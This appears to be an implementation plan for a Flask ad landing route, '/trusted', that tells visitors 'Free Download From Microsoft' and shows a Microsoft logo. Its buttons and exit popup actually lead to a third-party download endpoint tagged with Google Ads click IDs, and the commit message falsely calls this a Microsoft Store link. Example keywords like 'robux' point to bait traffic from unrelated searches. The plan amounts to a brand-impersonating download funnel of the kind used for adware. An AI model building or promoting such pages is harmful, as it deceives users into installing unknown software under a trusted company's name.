# Implementation Plan: Add `/trusted` Landing Page Route

## Overview
Add a new `/trusted` route to the Flask application that:
1. Uses a custom download tracking URL instead of Chrome/Edge store links
2. Maps the `gclid` from Google Ads to a `clickid` parameter (default: `666` if empty)
3. Displays a Microsoft logo instead of Chrome/Edge badges
4. Uses the same image caching logic as `/stackfree`

## Requirements Summary

### URL Structure
- Route: `/trusted`
- Parameters: `kw`, `img`, `gclid`
- Example: `https://www.eguidesearches.com/trusted?kw=robux&img=true&gclid=abc123`

### Download URL Redirect
- **Base URL:** `https://deskapp-events-service-stage-819820498454.us-central1.run.app/api/v1/download`
- **Fixed parameters:** `cid=9982`, `yid=tsda`
- **Dynamic parameter:** `clickid={gclid}` (from Google Ads referrer)
- **Default clickid:** `666` (if gclid is empty or not provided)
- **Full URL example:** `https://deskapp-events-service-stage-819820498454.us-central1.run.app/api/v1/download?cid=9982&yid=tsda&clickid=abc123`

### Visual Changes
- Microsoft logo at bottom (instead of Chrome/Edge badges)
- CTA button text: "Continue"
- Messaging tailored for Trusted Stocks app

### Microsoft Logo
- **Source file:** `documents\microsoft-logo.jfif`
- **Destination:** `static\microsoft-badge.png`

### Constraints
- Must NOT affect existing routes (`/`, `/stackfree`, `/demo-microsoft`)
- Use same `images/` cache folder for keyword images
- No A/B testing variants needed
- DO NOT push to production unless explicitly asked

---

## Files to Create/Modify

| File | Action | Description |
|------|--------|-------------|
| `static/microsoft-badge.png` | **CREATE** | Copy from `documents/microsoft-logo.jfif` |
| `templates/trusted.html` | **CREATE** | New template for /trusted route |
| `app.py` (line 282) | **MODIFY** | Add new /trusted route handler |

## Files NOT Modified (Safety)

| File | Status |
|------|--------|
| `templates/index_variant_a.html` | UNCHANGED |
| `templates/index_variant_b.html` | UNCHANGED |
| `templates/landing.html` | UNCHANGED |
| `app.py` routes `/` | UNCHANGED |
| `app.py` routes `/stackfree` | UNCHANGED |
| `config.py` | UNCHANGED |

---

## Implementation Steps

### Step 1: Copy Microsoft Logo to Static Folder
```bash
copy documents\microsoft-logo.jfif static\microsoft-badge.png
```

### Step 2: Create `templates/trusted.html` Template
Based on `index_variant_a.html` with these modifications:

| Element | New Value |
|---------|-----------|
| Main Title | "Free Download From Microsoft" |
| Subtitle | "Download for Free trusted stocks app to manage your portfolio - all in one powerful app" |
| CTA Button Text | "Continue" |
| CTA Button Link | Custom download URL with clickid |
| Store Badge | `microsoft-badge.png` |
| Exit Popup Text | "Continue to Download" |

### Step 3: Add Route to `app.py`
Insert at line 282 (after `/stackfree`, before `/demo-microsoft`):

```python
# === ROUTE 2C: Trusted Landing Page ===
@app.route('/trusted')
def trusted_landing():
    keyword = request.args.get('kw', 'trending').strip()
    show_images = request.args.get('img', '').lower() == 'true'
    gclid = request.args.get('gclid', '')

    # ... (sanitization and logging logic)

    response = make_response(render_template('trusted.html',
                         keyword=keyword,
                         gclid=gclid,
                         show_images=show_images,
                         browser_type=browser_type))
    return response
```

### Step 4: Test Locally
```bash
python app.py

# Test with gclid
http://localhost:5000/trusted?kw=stocks&img=true&gclid=test123
# Should open: ...download?cid=9982&yid=tsda&clickid=test123

# Test without gclid (default 666)
http://localhost:5000/trusted?kw=stocks&img=true
# Should open: ...download?cid=9982&yid=tsda&clickid=666
```

### Step 5: Deploy to Production (ONLY WHEN ASKED)
```bash
git add static/microsoft-badge.png templates/trusted.html app.py
git commit -m "Add /trusted landing page with Microsoft Store download link"
git push origin master
python deploy.py
```

---

## URL Parameter Flow

```
With GCLID:
Google Ad → /trusted?kw=robux&gclid=abc123
    ↓
CTA Click → download?cid=9982&yid=tsda&clickid=abc123

Without GCLID (uses default):
Direct visit → /trusted?kw=robux
    ↓
CTA Click → download?cid=9982&yid=tsda&clickid=666
```

---

## Verification Checklist

- [ ] Microsoft logo (`microsoft-badge.png`) exists in static folder
- [ ] `/trusted` route accessible
- [ ] Images load correctly with `?kw=test&img=true`
- [ ] CTA button text says "Continue"
- [ ] CTA click opens correct download URL
- [ ] `clickid` parameter contains `gclid` value when provided
- [ ] `clickid` parameter is `666` when gclid is empty
- [ ] Microsoft logo displays at bottom of page
- [ ] Exit popup shows and links to download URL
- [ ] Logs show `TRUSTED_PAGE` prefix
- [ ] Existing routes (`/`, `/stackfree`) unchanged and working
